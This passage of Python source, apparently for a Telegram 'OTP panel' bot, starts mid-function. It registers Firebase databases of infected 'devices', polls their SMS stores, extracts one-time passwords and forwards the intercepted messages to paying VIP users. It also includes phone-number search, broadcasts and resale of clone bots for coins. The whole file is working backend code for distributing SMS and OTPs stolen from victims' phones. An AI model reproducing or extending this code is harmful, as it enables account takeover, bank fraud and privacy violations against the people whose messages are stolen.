        results = await asyncio.gather(*(send_one(c) for c in targets), return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        failed = len(targets) - sent - (1 if chat_id in targets else 0)
        await wait.edit_text(f"📢 <b>BROADCAST DONE</b>\n✅ Sent: {sent}\n❌ Failed: {failed}", parse_mode="HTML")
        return True

    # ── /msg USER_ID MESSAGE ───────────────────────────────
    if cmd == "/msg":
        if len(args) < 2 or not args[0].isdigit():
            await update.message.reply_text("⚠️ Usage: <code>/msg USER_ID Your message</code>", parse_mode="HTML")
            return True
        uid = int(args[0])
        msg = args[1]
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")
        try:
            await app_to_use.bot.send_message(uid,
                f"📨 <b>MESSAGE FROM ADMIN</b>\n\n{msg}", parse_mode="HTML")
            await update.message.reply_text(f"✅ Delivered to <code>{uid}</code>.", parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text(f"❌ Failed: {e}")
        return True

    # ── /adddb NAME URL ────────────────────────────────────
    if cmd == "/adddb":
        if len(args) < 2:
            await update.message.reply_text("⚠️ Usage: <code>/adddb Name https://...</code>", parse_mode="HTML")
            return True
        name = args[0].strip()
        url = args[1].strip()
        if not url.startswith("http"):
            await update.message.reply_text("⚠️ URL must start with http.")
            return True
        if name in DATABASES:
            await update.message.reply_text(f"⚠️ '{name}' exists.")
            return True
        DATABASES[name] = url
        try:
            devs = await fetch_db_data(name, url)
            GLOBAL_DEVICE_CACHE[name] = devs
            await update.message.reply_text(
                f"✅ <b>ADDED</b>\n📛 {name}\n📱 Devices: {len(devs)}\n🗄 Total: {len(DATABASES)}",
                parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text(f"⚠️ Fetch failed: {e}")
        return True

    # ── /listdb ────────────────────────────────────────────
    if cmd == "/listdb":
        lines = [f"🗄 <b>DATABASES ({len(DATABASES)})</b>", "━━━━━━━━━━━━━━━━━━"]
        for i, (name, url) in enumerate(DATABASES.items(), 1):
            dev_count = len(GLOBAL_DEVICE_CACHE.get(name, []))
            lines.append(f"{i}. <b>{name}</b> — {dev_count} devices")
        text = "\n".join(lines)
        if len(text) > 4000: text = text[:4000] + "\n...[more]"
        await update.message.reply_text(text, parse_mode="HTML", disable_web_page_preview=True)
        return True

    # ── /count ─────────────────────────────────────────────
    if cmd == "/count":
        total = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
        online = sum(1 for devs in GLOBAL_DEVICE_CACHE.values() for d in devs if d.status == "online")
        with_num = sum(1 for devs in GLOBAL_DEVICE_CACHE.values() for d in devs if d.numbers)
        await update.message.reply_text(
            f"📱 <b>DEVICES</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"🗄 DBs: {len(DATABASES)}\n📱 Total: {total}\n"
            f"🟢 Online: {online}\n🔴 Offline: {total - online}\n"
            f"📞 With numbers: {with_num}\n⚙️ Without: {total - with_num}",
            parse_mode="HTML")
        return True

    # ── /clones ────────────────────────────────────────────
    if cmd == "/clones":
        if not CLONES:
            await update.message.reply_text("ℹ️ No clone bots.")
            return True
        lines = [f"🤖 <b>CLONES ({len(CLONES)})</b>", "━━━━━━━━━━━━━━━━━━"]
        now = time.time()
        for token, data in list(CLONES.items())[:20]:
            remaining = data.get("expiry", 0) - now
            if remaining <= 0:
                status = "❌ Expired"
            else:
                h = int(remaining // 3600)
                m = int((remaining % 3600) // 60)
                status = f"✅ {h}h {m}m"
            lines.append(f"🤖 @{data.get('username','unknown')}\n"
                         f"   👤 <code>{data.get('creator','?')}</code> | ⏱ {status}")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return True

    # ── /kill TOKEN ────────────────────────────────────────
    if cmd == "/kill":
        if not args:
            await update.message.reply_text("⚠️ Usage: <code>/kill BOT_TOKEN</code>", parse_mode="HTML")
            return True
        token_to_kill = args[0].strip()
        if token_to_kill not in CLONES:
            await update.message.reply_text("❌ Token not found.")
            return True
        clone_data = CLONES[token_to_kill]
        try:
            if clone_data.get("app"):
                await clone_data["app"].updater.stop()
                await clone_data["app"].stop()
                await clone_data["app"].shutdown()
        except Exception as e:
            tlog(f"Error killing clone: {e}")
        del CLONES[token_to_kill]
        await update.message.reply_text(f"✅ Killed @{clone_data.get('username','unknown')}", parse_mode="HTML")
        return True

    return False

# ════════════════════════════════════════════════════════════
#  TEXT MESSAGE HANDLER
# ════════════════════════════════════════════════════════════

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    text = (update.message.text or "").strip()
    bot_token = ctx.bot.token
    is_main_bot = (bot_token == TOKEN)

    if not is_main_bot:
        if bot_token not in CLONES: return
        if time.time() > CLONES[bot_token]["expiry"]:
            await update.message.reply_text("Aapka premium khatam ho gaya.")
            return
        users_db = CLONES[bot_token]["users"]
        is_admin = (chat_id == CLONES[bot_token]["creator"])
    else:
        users_db = all_users
        is_admin = (chat_id in ADMIN_IDS)

    if users_db.get(chat_id, {}).get("banned"): return
    await send_bonus_if_applicable(ctx, chat_id, users_db, is_main_bot)

    if is_spamming(chat_id): return

    # --- MAIN MENU ROUTING ---
    if text == "📱 Devices List":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        pending_action.pop(chat_id, None)
        if not is_vip(bot_token, chat_id):
            bots_created = users_db.get(chat_id, {}).get("bots_created", 0)
            req_bot_coins = 20 + (bots_created * 10)
            await update.message.reply_text(
                "🚫 <b>VIP Access Required!</b>\n━━━━━━━━━━━━━━━━━━\nAapke paas VIP access nahi hai. "
                "Niche diye gaye button se apna referral link share karein aur doston ko invite karke coins kamayein!",
                reply_markup=get_vip_denied_keyboard(chat_id, req_bot_coins) if is_main_bot else InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]),
                parse_mode="HTML")
            return
        devices = await get_all_devices(bot_token)
        await update.message.reply_text(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")
        return

    if text == "🔍 Search Number":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        if not is_vip(bot_token, chat_id):
            bots_created = users_db.get(chat_id, {}).get("bots_created", 0)
            req_bot_coins = 20 + (bots_created * 10)
            await update.message.reply_text("🚫 VIP required.", reply_markup=get_vip_denied_keyboard(chat_id, req_bot_coins) if is_main_bot else None)
            return
        pending_action[chat_id] = {"action": "search_number"}
        await update.message.reply_text("🔍 Enter number to search:\n\n❌ Cancel: /cancel")
        return

    if text == "🛡 Admin Panel" and is_admin:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        await update.message.reply_text(admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token), parse_mode="HTML")
        return

    if text.lower() in ("/cancel", "cancel"):
        if chat_id in pending_action:
            pending_action.pop(chat_id)
            await update.message.reply_text("✅ Cancelled.")
        else:
            await update.message.reply_text("ℹ️ No pending action.")
        return

    # --- PENDING ACTIONS PROCESSING ---
    state = pending_action.get(chat_id)
    if not state: return
    action = state.get("action")

    if action == "add_firebase_main" and is_admin and is_main_bot:
        pending_action.pop(chat_id)
        input_text = text.strip()
        if ":" in input_text:
            name, url = input_text.split(":", 1)
            name, url = name.strip(), url.strip()
        else:
            url = input_text
            match = re.search(r"https?://([^\.]+)", url)
            name = match.group(1).replace("-", "_").title() if match else f"DB_{len(DATABASES) + 1}"
        if not url.startswith("http"):
            await update.message.reply_text("⚠️ Invalid URL.")
            return
        if name in DATABASES:
            await update.message.reply_text(f"⚠️ '{name}' exists.")
            return
        DATABASES[name] = url
        try:
            devs = await fetch_db_data(name, url)
            GLOBAL_DEVICE_CACHE[name] = devs
            await update.message.reply_text(f"✅ Added {name} — {len(devs)} devices")
        except Exception as e:
            await update.message.reply_text(f"⚠️ Added but fetch failed: {e}")
        return

    if action == "gift_coins_all" and is_admin:
        pending_action.pop(chat_id)
        if not text.isdigit():
            await update.message.reply_text("⚠️ Number chahiye.")
            return
        coins_to_give = int(text)
        if coins_to_give <= 0:
            await update.message.reply_text("⚠️ Amount > 0.")
            return
        wait_msg = await update.message.reply_text(f"⏳ Sending {coins_to_give} coins...")
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")
        targets = list(users_db.keys())

        async def send_gift(uid):
            users_db[uid]["coins"] = users_db[uid].get("coins", 0) + coins_to_give
            try:
                await app_to_use.bot.send_message(
                    uid, f"🎁 <b>GIFT!</b> +<b>{coins_to_give} Coins</b>", parse_mode="HTML")
                return True
            except: return False

        results = await asyncio.gather(*(send_gift(u) for u in targets), return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        await wait_msg.edit_text(
            f"✅ Sent to {sent}/{len(targets)}.\n❌ Failed: {len(targets) - sent}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_refresh")]]))
        return

    if action == "create_bot" and is_main_bot:
        new_token = text
        req_coins = state.get("req_coins", 20)
        if not re.match(r"^\d+:[A-Za-z0-9_-]+$", new_token):
            await update.message.reply_text("⚠️ Invalid token format.")
            return
        pending_action.pop(chat_id)
        if all_users.get(chat_id, {}).get("coins", 0) < req_coins:
            await update.message.reply_text(f"❌ Need {req_coins} coins.")
            return
        wait_msg = await update.message.reply_text("⏳ Starting bot...")
        try:
            new_app = await start_clone_bot(new_token)
            bot_info = await new_app.bot.get_me()
            all_users[chat_id]["coins"] -= req_coins
            all_users[chat_id]["bots_created"] = all_users[chat_id].get("bots_created", 0) + 1
            CLONES[new_token] = {
                "creator": chat_id, "expiry": time.time() + 86400,
                "custom_db": None, "app": new_app, "users": {}, "username": bot_info.username
            }
            await wait_msg.edit_text(f"✅ Bot created: @{bot_info.username}\nExpiry: 24h")
            if _main_app:
                for adm in ADMIN_IDS:
                    try:
                        await _main_app.bot.send_message(adm,
                            f"🚨 <b>NEW CLONE!</b>\nCreator: <code>{chat_id}</code>\nBot: @{bot_info.username}",
                            parse_mode="HTML")
                    except: pass
        except Exception as e:
            await wait_msg.edit_text(f"❌ Error: {e}")
        return

    if action == "add_custom_db" and not is_main_bot and is_admin:
        custom_url = text
        if not custom_url.startswith("http"):
            await update.message.reply_text("⚠️ Invalid URL.")
            return
        pending_action.pop(chat_id)
        CLONES[bot_token]["custom_db"] = custom_url
        await update.message.reply_text("✅ Custom Firebase set!")
        return

    if action == "search_number":
        pending_action.pop(chat_id)
        search_term = re.sub(r"\D", "", text)
        if len(search_term) < 4:
            await update.message.reply_text("⚠️ At least 4 digits.")
            return
        wait_msg = await update.message.reply_text("⏳ Searching...")
        devices = await get_all_devices(bot_token)
        found_devs = [d for d in devices if any(search_term in num for num in d.numbers)]
        if not found_devs:
            await wait_msg.edit_text("📭 No matches.")
            return
        rows = []
        for d in found_devs[:10]:
            tag = f"[{d.db_tag}] "
            icon = "🟢" if d.status == "online" else "🔴"
            lbl = f"{icon} 📱 {tag}{' & '.join(d.numbers)}"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
        rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
        await wait_msg.edit_text(f"🔍 {search_term}", reply_markup=InlineKeyboardMarkup(rows))
        return

    if action == "broadcast_msg" and is_admin:
        pending_action.pop(chat_id)
        targets = chats_registry.get(bot_token, set())
        wait_msg = await update.message.reply_text(f"⏳ Broadcasting to {len(targets)}...")
        app_to_use = _main_app if is_main_bot else CLONES[bot_token].get("app")

        async def send_bc(cid):
            if cid == chat_id: return False
            try:
                await app_to_use.bot.send_message(cid, text, parse_mode="HTML")
                return True
            except: return False

        results = await asyncio.gather(*(send_bc(cid) for cid in targets), return_exceptions=True)
        sent = sum(1 for r in results if r is True)
        failed = len(targets) - sent - (1 if chat_id in targets else 0)
        await wait_msg.edit_text(
            f"📢 Sent: {sent}\n❌ Failed: {failed}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_refresh")]]))
        return

# ════════════════════════════════════════════════════════════
#  POLLING ENGINE (FIREBASE -> TELEGRAM)
# ════════════════════════════════════════════════════════════

async def _forward_sms(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return
    label = device_label(device)
    otp = extract_otp(body)
    msg_text = auto_forward_msg(sms, label)
    
    kb_rows = [
        [InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{device.id}")]
    ]
    markup = InlineKeyboardMarkup(kb_rows)
    
    send_tasks = []
    for bot_token, chat_dict in user_focus.items():
        if bot_token != TOKEN:
            if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: continue
            app_to_use = CLONES[bot_token].get("app")
            users_db = CLONES[bot_token]["users"]
        else:
            app_to_use = _main_app
            users_db = all_users
        if not app_to_use: continue
        target_chats = [cid for cid, did in chat_dict.items() if did == device.id and is_vip(bot_token, cid)]
        for chat_id in target_chats:
            if otp:
                users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode="HTML"))
    if send_tasks:
        await asyncio.gather(*send_tasks, return_exceptions=True)

async def poll_single_db(tag: str, url: str) -> int:
    try:
        r_main, r_user, r_root = await asyncio.gather(
            fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url))
        forwarded = 0
        devices_in_db = GLOBAL_DEVICE_CACHE.get(tag, [])
        device_map = {d.id: d for d in devices_in_db}
        for bulk_data in (r_main, r_user, r_root):
            if not isinstance(bulk_data, dict): continue
            for dev_id, sms_dict in bulk_data.items():
                if not isinstance(sms_dict, dict): continue
                device = device_map.get(dev_id)
                for k, sms in sms_dict.items():
                    if not isinstance(sms, dict): continue
                    sk = seen_key(dev_id, k)
                    if sk in seen_ids: continue
                    seen_ids.add(sk)
                    if device:
                        try:
                            await _forward_sms(device, sms)
                            forwarded += 1
                        except: pass
        type4_devs = [d for d in devices_in_db if d.sms_path.endswith("receivedSms")]
        if type4_devs:
            async def fetch_t4_sms(d: Device):
                fwd = 0
                sms_dict = await fb_get(d.sms_path, d.base_url)
                if isinstance(sms_dict, dict):
                    for k, sms in sms_dict.items():
                        if not isinstance(sms, dict): continue
                        sk = seen_key(d.id, k)
                        if sk in seen_ids: continue
                        seen_ids.add(sk)
                        try:
                            await _forward_sms(d, sms)
                            fwd += 1
                        except: pass
                return fwd
            results = await asyncio.gather(*(fetch_t4_sms(d) for d in type4_devs))
            forwarded += sum(results)
        return forwarded
    except: return 0

async def poll_loop(app: Application) -> None:
    global first_run, _main_app
    _main_app = app
    while True:
        try:
            dbs_to_poll = dict(DATABASES)
            for c_token, c_data in CLONES.items():
                if time.time() < c_data["expiry"] and c_data.get("custom_db"):
                    dbs_to_poll[f"C_{c_token[:6]}"] = c_data["custom_db"]
            for tag, url in dbs_to_poll.items():
                try:
                    devs = await fetch_db_data(tag, url)
                    GLOBAL_DEVICE_CACHE[tag] = devs
                except: pass
            if first_run:
                for tag, url in dbs_to_poll.items():
                    r_main, r_user, r_root = await asyncio.gather(
                        fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url))
                    for bulk in (r_main, r_user, r_root):
                        if not isinstance(bulk, dict): continue
                        for dev_id, sms_dict in bulk.items():
                            if not isinstance(sms_dict, dict): continue
                            for k in sms_dict: seen_ids.add(seen_key(dev_id, k))
                    type4_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.sms_path.endswith("receivedSms")]
                    if type4_devs:
                        async def init_t4(d: Device):
                            sms_dict = await fb_get(d.sms_path, d.base_url)
                            if isinstance(sms_dict, dict):
                                for k in sms_dict: seen_ids.add(seen_key(d.id, k))
                        await asyncio.gather(*(init_t4(d) for d in type4_devs))
                first_run = False
                tlog("✅ Bot Engine ready!")
            else:
                tasks = [poll_single_db(tag, url) for tag, url in dbs_to_poll.items()]
                await asyncio.gather(*tasks)
        except Exception:
            pass
        await asyncio.sleep(POLL_INTERVAL)

# ════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════

def main() -> None:
    keep_alive()  # <--- RENDER SERVER
    
    if not TOKEN:
        raise SystemExit("❌ TOKEN missing!")

    print("═" * 56)
    print("  🤖 OTP PANEL BOT — SUPREME MASTER EDITION v4.3")
    print("  🚀 All Admin Commands + VIP Engine Active")
    print("═" * 56)

    app = (
        Application.builder()
        .token(TOKEN)
        .connection_pool_size(1000)
        .pool_timeout(60.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .build()
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("points", cmd_points))
    app.add_handler(CommandHandler("referral", cmd_referral))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.COMMAND, on_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(global_error_handler)

    async def post_init(application: Application) -> None:
        load_data()
        await register_commands(application)

        for clone_token, c_data in list(CLONES.items()):
            if time.time() < c_data.get("expiry", 0):
                try:
                    tlog(f"Restarting clone: @{c_data.get('username')}")
                    clone_app = await start_clone_bot(clone_token)
                    CLONES[clone_token]["app"] = clone_app
                except Exception as e:
                    tlog(f"Failed to restart {clone_token}: {e}")

        asyncio.create_task(poll_loop(application))
        asyncio.create_task(auto_save_loop())

    app.post_init = post_init
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
